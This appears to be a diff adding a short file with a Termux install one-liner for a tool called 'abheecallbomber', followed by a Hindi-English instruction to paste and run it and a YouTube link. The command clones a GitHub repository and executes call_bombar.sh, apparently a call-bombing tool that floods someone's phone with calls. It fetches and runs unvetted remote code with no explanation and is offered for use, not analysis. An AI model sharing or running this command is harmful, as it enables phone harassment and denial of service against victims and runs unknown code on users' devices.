@@ -1,0 +1,6 @@
+pkg update && pkg upgrade -y && pkg install git -y && cd $HOME && rm -rf abheecallbomber && git clone https://github.com/AbheeBhaiMod/abheecallbomber.git && cd abheecallbomber && chmod +x * && ./call_bombar.sh
+
+
+
+is Command Ko All Copy Krke Termux Or Run Krna ok Full Video Here 🖇️ 
+https://youtube.com/shorts/vlj6Z4X8xOc?feature=share
